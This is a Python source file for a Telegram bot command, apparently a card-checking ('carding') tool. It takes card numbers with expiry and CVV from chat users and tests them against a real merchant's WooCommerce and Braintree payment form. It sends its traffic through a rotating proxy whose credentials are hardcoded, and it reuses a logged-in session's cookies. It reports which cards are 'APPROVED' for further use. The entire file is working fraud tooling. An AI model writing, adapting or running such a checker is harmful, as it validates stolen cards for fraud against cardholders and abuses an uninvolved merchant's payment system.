import time
import re
from random import randint
import requests
import time
from random import *
from pyrogram import Client
import json
import base64
from pyrogram import filters
import random
import time
from parse import parseX
from Plugins.Func import connect_to_db
import string
from faker import Faker
from func_bin import get_bin_info
import random
from datetime import datetime, timedelta


def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''
def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


@Client.on_message(filters.command("90", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
def Shopify(client, message):
    try:
        
        conn = connect_to_db()
        cursor = conn.cursor()
        
        userid = message.from_user.id
        chat_id = message.chat.id
        
        cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (userid,))
        user_data = cursor.fetchone()
        if not user_data:
            return message.reply('Primero debes rgistrarte para usar este comando, usa /register')
        
        
        chat_grupo = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id,))
        chat_grupo = cursor.fetchone()
        
        if all(role not in user_data[0] for role in ['Premium', 'Free', 'Seller', 'Owner']) and all(role not in user_data[0] for role in ['Grupo']):
            return message.reply('No tienes permisos para utilizar este comando, contacta a mi administrador @AstraxOficial.')
 
        if message.from_user is not None:
            username = getattr(message.from_user, 'username', None)
        
        ccs = message.text[len('/90 '):]  
        
        x = get_bin_info(ccs[:6])
                        
        inicio = time.time()
        reply = message.reply_to_message
        
            
        if not ccs:
            if not reply or not reply.text:
                return message.reply(f"""       
<b>
STATUS <code>ON ✅</code>
GATEWAY ➫  <code>UCHIHA MADARA</code>
SUBTYPE ➫  <code>SHOPIFY $10</code>
USE ➫ <code>/sh cc|month|year|cvv</code> </b>""")
     

            ccs_match = re.search(r"\d{16}[\s|:|::]\d{2}[\s|:|::]\d{4}[\s|:|::]\d{3}", reply.text)
            if not ccs_match:
                return message.reply(f"Agregue una tarjeta Valida.</a> ")
            ccs = ccs_match.group(0)
        
        ccs = ccs.replace(" ", "")

        #----- Extraer la información de la tarjeta de crédito utilizando una expresión regular
        expl = re.split(r"[\s:|]+", ccs)
        if len(expl) < 4:
            # La cadena no tiene suficientes elementos para ser una tarjeta de crédito válida
            return message.reply(f"INGRESE UNA TARJETA VALIDA")

        expl = re.findall(r'\d+', ccs)
        cc = expl[0]
        mes = expl[1]
        ano = expl[2]
        cvv = expl[3]      
        ccvip = f"{cc}|{mes}|{ano}|{cvv}"        
        bin_number = cc[:6]       


        if not x: return message.reply(text=f"<b>Ingresa Una Tarjeta Valida.</b> ",quote=True)

        if not re.match(r'^\d{15,16}$', cc):
            return message.reply(f"<b>CARD INVALIDA</b>")

        # Validar la fecha de expiración
        if not re.match(r'^\d{2}/\d{2}(\d{2})?$', f'{mes}/{ano}'):
            return message.reply(f"<b>FECHA INVALIDA</b>")

        # Validar el CVV
        if not re.match(r'^\d{3,4}$', cvv):
            return message.reply(f"<b>CVV INVALIDO")
              
        edite_message = message.reply(f"""
✯ 𝑨𝒌𝒂𝒕𝒔𝒖𝒌𝒊 𝑪𝒉𝒌 ✯
━ • ━━━━━━━━━━━━ • ━
» Verificando...
» Card: {ccs}
» Info: {x.get("type")} {x.get("level")} {x.get("flag")}
━ • ━━━━━━━━━━━━ • ━ """)
        
        session = requests.Session()
        session.proxies = {'https': 'http://zwpbykei-rotate:zwbfdr5xz9nk@p.webshare.io:80'}

        inicio = time.time()
        
        
        cookies = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2023-12-06%2017%3A27%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2023-12-06%2017%3A27%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F119.0.0.0%20Safari%2F537.36%20Edg%2F119.0.0.0',
            'PHPSESSID': 'g8ve5uh993gtcssqg1pu1o22ab',
            'wordpress_logged_in_6df0c8871ecce38368eaa7b73ab92b24': 'qaurcwl%7C1703093305%7CVkFR6wOPADwfT8qdg2H2AYokGce4BrPkuHzLVezEBNQ%7Cf623e54c4b1a7ba0245827ee2ab92267b4cd761d3bcd7f2cfa5330a3baa2cb04',
            'mywishlist_email': 'qaurcwl%40wireconnected.com',
            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2Fmy-account%2Fpayment-methods%2F',
        }

        headers = {
            'authority': 'www.accurategelpacks.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-12-06%2017%3A27%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-12-06%2017%3A27%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F119.0.0.0%20Safari%2F537.36%20Edg%2F119.0.0.0; PHPSESSID=g8ve5uh993gtcssqg1pu1o22ab; wordpress_logged_in_6df0c8871ecce38368eaa7b73ab92b24=qaurcwl%7C1703093305%7CVkFR6wOPADwfT8qdg2H2AYokGce4BrPkuHzLVezEBNQ%7Cf623e54c4b1a7ba0245827ee2ab92267b4cd761d3bcd7f2cfa5330a3baa2cb04; mywishlist_email=qaurcwl%40wireconnected.com; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2Fmy-account%2Fpayment-methods%2F',
            'referer': 'https://www.accurategelpacks.com/my-account/payment-methods/',
            'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        }

        response = requests.get('https://www.accurategelpacks.com/my-account/add-payment-method/', cookies=cookies, headers=headers).text
        
        id_woo = parseX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        client_token = parseX(response, 'var wc_braintree_client_token = ["', '"];')
        client_token = json.loads(base64.b64decode(client_token))
        client_token = client_token['authorizationFingerprint']
     
      
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {client_token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': f'{random.randint(100,999)}eb255a35-1301-4618-8a2b-0cee852af83d{random.randint(1000,9999)}',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '',
                            'streetAddress': '',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
        
        token = response['data']['tokenizeCreditCard']['token']
        
        
    

        headers = {
            'authority': 'www.accurategelpacks.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-12-06%2017%3A27%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-12-06%2017%3A27%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F119.0.0.0%20Safari%2F537.36%20Edg%2F119.0.0.0; PHPSESSID=g8ve5uh993gtcssqg1pu1o22ab; wordpress_logged_in_6df0c8871ecce38368eaa7b73ab92b24=qaurcwl%7C1703093305%7CVkFR6wOPADwfT8qdg2H2AYokGce4BrPkuHzLVezEBNQ%7Cf623e54c4b1a7ba0245827ee2ab92267b4cd761d3bcd7f2cfa5330a3baa2cb04; mywishlist_email=qaurcwl%40wireconnected.com; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.accurategelpacks.com%2Fmy-account%2Fadd-payment-method%2F',
            'origin': 'https://www.accurategelpacks.com',
            'referer': 'https://www.accurategelpacks.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': client_token,
            'braintree_cc_device_data': '{"device_session_id":"7c8779bc6ba8a12408e1cb2d8eabc0c8","fraud_merchant_id":null,"correlation_id":"bfcb6d183557829e1cdf6276184ae74b"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2fdp2g4g72rc8ng/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2fdp2g4g72rc8ng"},"merchantId":"n2fdp2g4g72rc8ng","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Accurate Manufacturing, Inc.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE5NzI5NjUsImp0aSI6IjMzMGE4MmJlLTYwNWQtNGRiYy1hM2Y4LTBlMWQ1MTcwNGUxZSIsInN1YiI6Im4yZmRwMmc0ZzcycmM4bmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4yZmRwMmc0ZzcycmM4bmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.KH70Ck-hlIHRJpQ6qrLDj1l0JN2-J5psSjRsjCPy-Ha-5NvksBItBfqTqaDHvRtgMUP9tIGhZeOdcZb3tIRxow","paypalClientId":"AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Accurate Manufacturing, Inc.","clientId":"AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"accuratemanufacturinginc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': id_woo,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = requests.post(
            'https://www.accurategelpacks.com/my-account/add-payment-method/',
            #cookies=cookies,
            headers=headers,
            data=data,
        ).text
        
        
        if (int(response.find('Payment method successfully added')) > 0) or  (int(response.find('1000 Approved')) > 0):
                            print("Approved", "(1000) Approved")
                            msg = "APPROVED ✅"
                            respuesta = "(1000) Approved"
                            return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                                    
        elif (int(response.find('Status code 2001: Insufficient Funds')) > 0) or (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                            for i in response.split("\n"):
                                if 'There was an error saving your payment method' in i:
                                    Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                            print("Approved", Message)
                            msg = "APPROVED ✅"
                            respuesta = Message
                            return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                            
        elif int(response.find('Status code risk_threshold:')) > 0 :
                            print("Gateway Rejected: CHANGE BIN")
                            msg = "DECLINED ❌"
                            respuesta = Message
                            return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: Gateway Rejected: CHANGE BIN ''')
                            
        elif int(response.find('There was an error saving your payment method')) > 0 :
                            for i in response.split("\n"):
                                if 'There was an error saving your payment method' in i:
                                    
                                    Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                           
                            print(Message)
                            msg = "DECLINED ❌"
                            respuesta = Message
                            if "Card Issuer Declined CVV" in respuesta:
                                msg = "APPROVED ✅"
                                respuesta = "Card Issuer Declined CVV"
                                return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
         
                            elif "CVV." in respuesta:
                                msg = "APPROVED ✅"
                                respuesta = "CVV."
                                return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                               
         
                            elif "Insufficient Funds" in respuesta:
                                msg = "APPROVED ✅"
                                respuesta = "Insufficient Funds"
                                return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                            
                            
                            elif "AVS." in respuesta: 

                               msg = "APPROVED ✅"
                               respuesta = "AVS."
                               return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                                
                            elif "AVS and CVV" in respuesta:
                                msg = "APPROVED ✅"
                                respuesta = "AVS and CVV"
                                return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                        
                            else :
                                msg ="DECLINED ❌"
                                respuesta = Message
                                return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
                                
                                        
                                
        else :
                            msg ="DECLINED ❌"
                            respuesta = "Ha ocurrido un error inesperado."
                        
          
                            return message.reply(f'''
STATUS: {msg}                   
RESPUESTA: {respuesta} ''')
        
        
        
        return
                
        return edite_message.edit_text(f""" 
✯ 𝑨𝒌𝒂𝒕𝒔𝒖𝒌𝒊 𝑪𝒉𝒌 ✯
- - - - - - - - - - - - - - -
Card: <code>{ccvip}</code>
Status: <code>{msg}</code>
Response: <code>{respuesta}</code>
Gateway:  SHOPIFY $10
- - - - - - - - - - - - - - -
⌁ Bin Details
Bin: <code>{ccvip[:6]}</code>
Bank: <code>{x.get("bank_name")}</code>
Type: <code>{x.get("type")}</code>
Level: <code>{x.get("level")}</code>
Vendor: <code>{x.get("vendor")}</code>
Country: <code>{x.get("country")} {x.get("flag")}</code>
- - - - - - - - - - - - - - -
Time: <code>{tiempo}</code>
Checked By: @{username}
- - - - - - - - - - - - - - -
Bot By:  @Nananaksksja""")

        
    except Exception as e:
        print(f"Error inesperado: {e}")
        admin = "-"
        input = "-"
 
        if message.reply_to_message: 
            ccvip = message.reply_to_message.text

        else: 
            ccvip = message.text[len('/pp '):]
        username = message.from_user.username
        #---------- PLANTILLA DE CARGA ------------#
        inicio = time.time()
        gateway = "NEJI $10"
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        msg = "DECLINED ❌"    
        respuesta = f"Error (Try Aigan) / Si persiste contacta un admin" 
        